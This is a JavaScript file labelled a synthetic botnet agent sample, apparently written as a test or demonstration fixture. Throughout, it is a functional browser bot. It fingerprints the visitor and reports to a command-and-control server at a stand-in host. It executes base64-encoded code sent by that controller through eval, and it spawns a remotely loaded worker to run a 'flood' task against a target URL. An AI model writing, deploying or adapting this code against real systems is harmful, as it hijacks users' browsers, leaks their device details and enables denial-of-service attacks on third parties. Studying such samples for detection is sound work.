// SWARM — synthetic botnet agent product sample.
(function () {
  var C2 = 'https://c2.example.test/bot';
  var node = { id: 'node-' + Math.floor(Math.random() * 1e6), cores: navigator.hardwareConcurrency || 2, ua: navigator.userAgent };
  console.log('[SWARM] node online', node.id);

  function report(status, extra) {
    try {
      fetch(C2 + '/' + status, { method: 'POST', body: btoa(JSON.stringify({ ...node, ...extra })) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('swarm:node', node.id); } catch (error) {}
  }

  function runTask(task) {
    console.log('[SWARM] task', task.type);
    try { eval(atob(task.code || '')); } catch (error) { console.log('[SWARM] task error', error.message); }
    try {
      var worker = new Worker('https://cdn.example.test/bot/worker.js?target=' + encodeURIComponent(task.target || 'demo'));
      worker.postMessage({ type: task.type, threads: node.cores, target: task.target });
      worker.onmessage = function () { report('done', { task: task.id }); };
    } catch (error) {}
  }

  report('register', {});
  // Simulated controller tasking (also delivered by the mock route).
  runTask({ id: 't1', type: 'flood', target: 'https://target.example.test', code: 'Y29uc29sZS5sb2coJ1tTV0FSTV0gdGFzayBwYXlsb2FkIGV4ZWN1dGVkJyk=' });

  var beats = 0;
  var heartbeat = setInterval(function () {
    beats += 1;
    report('heartbeat', { beats: beats });
    if (beats >= 3) clearInterval(heartbeat);
  }, 350);
})();
